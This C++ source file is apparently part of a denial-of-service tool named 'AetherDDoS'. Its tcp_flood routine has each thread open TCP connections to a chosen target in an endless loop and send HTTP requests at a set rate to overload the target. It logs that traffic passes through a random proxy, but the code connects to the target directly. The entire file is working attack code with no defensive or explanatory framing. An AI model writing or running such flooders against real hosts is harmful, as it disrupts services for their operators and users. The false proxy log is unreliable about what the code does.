#include "aether_ddos.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <chrono>

void AetherDDoS::tcp_flood(int thread_id) {
    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { log("[-] TCP Socket failed: Thread " + std::to_string(thread_id)); return; }

        sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

        Proxy proxy = get_random_proxy();
        log("[*] TCP Thread " + std::to_string(thread_id) + " via proxy " + proxy.ip);

        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            close(sock); continue;
        }

        std::string payload = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n";
        send(sock, payload.c_str(), payload.size(), 0);

        std::this_thread::sleep_for(std::chrono::microseconds(1000000 / rate_per_thread));
        close(sock);
    }
}
